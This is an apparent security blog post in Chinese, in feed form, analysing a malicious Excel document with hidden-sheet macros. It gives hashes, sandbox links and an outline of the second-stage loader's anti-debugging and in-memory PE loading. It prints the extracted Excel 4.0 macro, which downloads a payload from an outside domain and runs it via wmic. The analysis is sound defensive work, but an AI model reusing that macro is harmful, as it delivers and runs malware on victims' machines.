    <published>2021-06-08T17:47:43.000Z</published>
    <updated>2021-06-08T18:00:24.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>信息来源：<a href="https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m" target="_blank" rel="noopener">https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m</a><br><img src="https://z3.ax1x.com/2021/06/09/2so9S0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀：<a href="https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection</a></p><pre><code>MD5    4fb331e4e5c6094e731690371687b110SHA-1    bcecaaba6462550c61f7ed572e2c06ef8f3f378aSHA-256    b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7feVhash    ec726ed39dd1773fb0790767871cde5cSSDEEP    12288:HMc+2YnB6YTbkvA00E+XvQNBzcytqew5W99QPR69Ke+SajzvEnj/igo7tbhzdSNN:H8sYvkhRzdoW9yRCh+vwnj/it7vBSjTLSH    T148F423A542CEFD48EA3A3D3761C5039DA197ACEB93150F420E73DB22D99A6F32511F18</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2so30e.png" alt=""></p><p>执行流程<br><img src="https://z3.ax1x.com/2021/06/09/2so8TH.png" alt=""></p><p>下载下来，打开是典型的隐藏表执行宏<br><img src="https://z3.ax1x.com/2021/06/09/2soJkd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2soYtA.png" alt=""></p><p>逐个提取出里面的vba，得到的结果是这样的<br><img src="https://z3.ax1x.com/2021/06/09/2sod6f.png" alt=""></p><pre><code>Auto_Open=AB16() ;=FORMULA.ARRAY(&#39;reierj ntrutruiret eruireur&#39;!AJ17&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ18&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ19&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ20&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ21&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ22&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ23&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ24,AB17)=Z16() ;Z16=CALL(AB17,AC17,&quot;JCJ&quot;,AD16,0) //Kernel32,,JCJ,C:/Users/Public,0=CALL(&quot;UR&quot;&amp;&#39;reierj ntrutruiret eruireur&#39;!AM18,&#39;reierj ntrutruiret eruireur&#39;!AN17&amp;&#39;reierj ntrutruiret eruireur&#39;!AN18&amp;&#39;reierj ntrutruiret eruireur&#39;!AN19&amp;&#39;reierj ntrutruiret eruireur&#39;!AN20&amp;&#39;reierj ntrutruiret eruireur&#39;!AN21&amp;&#39;reierj ntrutruiret eruireur&#39;!AN22&amp;&#39;reierj ntrutruiret eruireur&#39;!AN23&amp;&#39;reierj ntrutruiret eruireur&#39;!AN24&amp;&#39;reierj ntrutruiret eruireur&#39;!AN25&amp;&#39;reierj ntrutruiret eruireur&#39;!AN26&amp;&#39;reierj ntrutruiret eruireur&#39;!AN27&amp;&#39;reierj ntrutruiret eruireur&#39;!AN28&amp;&#39;reierj ntrutruiret eruireur&#39;!AN29&amp;&#39;reierj ntrutruiret eruireur&#39;!AN30&amp;&#39;reierj ntrutruiret eruireur&#39;!AN31&amp;&#39;reierj ntrutruiret eruireur&#39;!AN32&amp;&#39;reierj ntrutruiret eruireur&#39;!AN33&amp;&#39;reierj ntrutruiret eruireur&#39;!AD17,AH24,0,A96,&#39;reierj ntrutruiret eruireur&#39;!AD16&amp;&#39;reierj ntrutruiret eruireur&#39;!AE16,0,0) //URLMon URLDownloadToFileA JJCCBB,0,https://opposedent.com/css/main.css  C:/Users/Public//send.css=AE25()  ;EXEC(&quot;wmic process call create &#39;C:/Users/Public/send.css&#39;&quot;)//远程下载https://opposedent.com/css/main.css 保存在C:/Users/Public/send.css，wmic创建进程执行C:/Users/Public/send.css</code></pre><p><strong> main.css </strong><br>MD5    6f891127db5efdb86a63c7a60a96103f<br>SHA-1    590945c764eb6acccadba94c02d0bc710886f865<br>SHA-256    944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b<br>Vhash    075066551d1d15155az5e!z<br>Authentihash    da7ab1728350ba9cf4a5f8dfa807d89002ad70db8c76829562500c0044776b37<br>Imphash    60f1da2d26406f6f3578f73785af8e9a<br>Rich PE header hash    004ccbc588d0cc025f006eb509f7f855<br>SSDEEP    12288:cGMMRFE7g6Ys/K7zyfuJTsQp4Cp6y5SrL1znr2LphlYuGUoPavYWIJdvrQoDpNkr:9zwRYs/K7ziuKU4jALFYuGDQ2vQoDkRN<br>TLSH    T10AF48D307A52C038F5FB21F85AA9DE34941DBAB0671C68CB63D55EE9D6385F89C3021B<br>PE查询结果<br><img src="https://z3.ax1x.com/2021/06/09/2soBnS.png" alt=""></p><p>VC写的，x86，开了ASLR<br><img src="https://z3.ax1x.com/2021/06/09/2soD0g.png" alt=""></p><p>整体流程是：</p><pre><code>1. 延时几秒2. 反调试检测3. 获取当前进程路径4. 读取自身，设置文件指针，文件数据读取5. 内存区域更改6. 加载执行</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2sor7Q.png" alt=""></p><p>反调试检测<br><img src="https://z3.ax1x.com/2021/06/09/2soykj.png" alt=""></p><p>加载对应的DLL和实例化对应的API<br><img src="https://z3.ax1x.com/2021/06/09/2so6ts.png" alt=""></p><p>读取自身<br><img src="https://z3.ax1x.com/2021/06/09/2sochn.png" alt=""></p><p>加载对应的DLL和API<br><img src="https://z3.ax1x.com/2021/06/09/2so2pq.png" alt=""></p><p>内存加载的PE<br><img src="https://z3.ax1x.com/2021/06/09/2soR10.png" alt=""></p><p>调试过一遍后，没看出什么危险的操作。利用沙箱运行得到以下结果<br><a href="https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013</a><br><img src="https://z3.ax1x.com/2021/06/09/2soWcV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2sofXT.png" alt=""></p><h2 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h2><pre><code>1. Excel隐藏表执行宏2. 反调试，反沙箱3. 读取自身内存加载PE执行</code></pre><p>能力有限，勿喷</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;信息来源：&lt;a href=&quot;https://nitter.domain.glass/Arkbird_SOLG/status/14008454</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
</feed>
